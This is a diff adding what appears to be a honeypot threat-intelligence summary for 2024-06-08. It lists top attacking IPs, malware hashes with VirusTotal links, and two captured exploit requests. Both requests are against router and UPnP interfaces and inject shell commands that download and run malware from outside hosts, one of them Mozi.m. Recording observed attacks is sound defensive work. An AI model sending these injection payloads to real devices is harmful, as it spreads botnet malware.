@@ -1,0 +1,47 @@
+Top 5 IPs for 2024-06-08 :
+
+1.70.128.213
+170.106.167.185
+165.232.131.191
+159.223.25.27
+43.163.219.38
+
+
+Malware Observed:
+
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+1db1583bb4154934d467dd1522a3c03fb776ca94e73250db0e0c978079e5a481
+https://www.virustotal.com/gui/file/1db1583bb4154934d467dd1522a3c03fb776ca94e73250db0e0c978079e5a481
+
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+
+Commands/exploits observed:
+
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.177.35.32/tajma.mpsl; chmod 777 tajma.mpsl; ./tajma.mpsl tajma.mpsl;rm -rf *mpsl*;
+
+
+
+POST /picsdesc.xml HTTP/1.1
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: /
+User-Agent: Hello-World
+Connection: keep-alive
+
+<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope//\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>cd /var/; wget http://59.91.174.133:59669/Mozi.m; chmod +x Mozi.m; ./Mozi.m</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
+
